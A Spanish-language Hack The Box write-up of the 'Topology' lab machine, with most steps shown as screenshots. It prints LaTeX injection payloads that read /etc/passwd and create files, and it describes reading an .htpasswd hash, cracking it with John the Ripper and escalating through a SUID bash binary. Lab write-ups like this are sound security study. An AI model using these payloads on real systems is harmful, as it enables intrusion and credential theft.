---
title: Write-up Topology [Easy] - Hack The Box
date: 2023-09-18
categories: [Writeups, Hack The Box]
tags: [writeup, hackthebox, machines, easy, pentesting]
image: /assets/img/hackthebox/machines/topology/topology.png
image_link: false
---

Publicación del write-up de sujeto a las [guías generales](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) de Hack The Box.

# Write-up Topology \[Easy\] - Hack The Box 
\\
**Mi perfil de Hack The Box: [julianglez16](https://app.hackthebox.com/users/1084561)**


# Enumeración


### Puertos


![Untitled.png](/assets/img/hackthebox/machines/topology/puertos1.png)
![Untitled.png](/assets/img/hackthebox/machines/topology/puertos2.png)


### Tecnologías web


![Untitled.png](/assets/img/hackthebox/machines/topology/tecnologias-web.png)



### Funcionalidad web


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(3).png)


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(4).png)

![Resultado de enviar \frac{x+5}{y-3} en el formulario](/assets/img/hackthebox/machines/topology/Untitled%20(5).png)



Tras descargar el PNG generado y analizarlo con `exiftool` se obtiene lo siguiente


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(6).png)



### Análisis con BurpSuite


![Petición generada al enviar el formulario](/assets/img/hackthebox/machines/topology/Untitled%20(7).png)


# Explotación


### Usuario


La página principal de `latex.topology.htb` contiene los siguientes ficheros:


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(8).png)



Siguiendo los posibles _payloads_ disponibles en _Hacktricks_ [(https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection)](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection)


se puede leer el fichero `/etc/passwd` fácilemente con el siguiente _payload_:


```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```


![Lectura de la primera línea del fichero /etc/passwd](/assets/img/hackthebox/machines/topology/Untitled%20(9).png)



Con el siguiente _payload_ se puede crear un fichero. No se puede escribir dentro nada ya que el comando LaTeX `\write` está prohibido.


```latex
\newwrite\outfile 
\openout\outfile=tempfiles/aaa.txt 
\closeout\outfile
```


![Fichero aaa.txt creado con el comando de LaTeX](/assets/img/hackthebox/machines/topology/Untitled%20(10).png)



Con el comando `$\lstinputlisting{/etc/passwd}$` se puede leer un fichero completo y ver su contenido:


![Contenido completo del fichero /etc/hosts](/assets/img/hackthebox/machines/topology/Untitled%20(11).png)


Leyendo el fichero `/etc/apache2/sites-enabled/000-default.conf` se pueden ver dos subdominios adicionales no enumerados hasta ahora.


![Contenido del fichero /etc/apache2/sites-enabled/000-default.conf](/assets/img/hackthebox/machines/topology/Untitled%20(12).png)


En la web `stats.topology.htb` solamente se encuentra lo siguiente:


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(13).png)



En la web `dev.topology.htb` se encuentra un login para el cual no tenemos credenciales.


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(14).png)



Intentando leer el fichero `/var/www/dev/.htpasswd` se obtiene lo siguiente:


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(15).png)



Utilizando _JohnTheRipper_ se obtiene la contraseña del usuario `vdaisley`


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(16).png)


### Root


Una vez realizada la conexión SSH se comprueban los binarios con permisos SUID y se observa que existen permismos de SUID en el binario `/usr/bin/bash` 


![Untitled.png](/assets/img/hackthebox/machines/topology/Untitled%20(17).png)



![Abuso de los permisos de SUID en el binario /usr/bin/bash](/assets/img/hackthebox/machines/topology/Untitled%20(18).png)

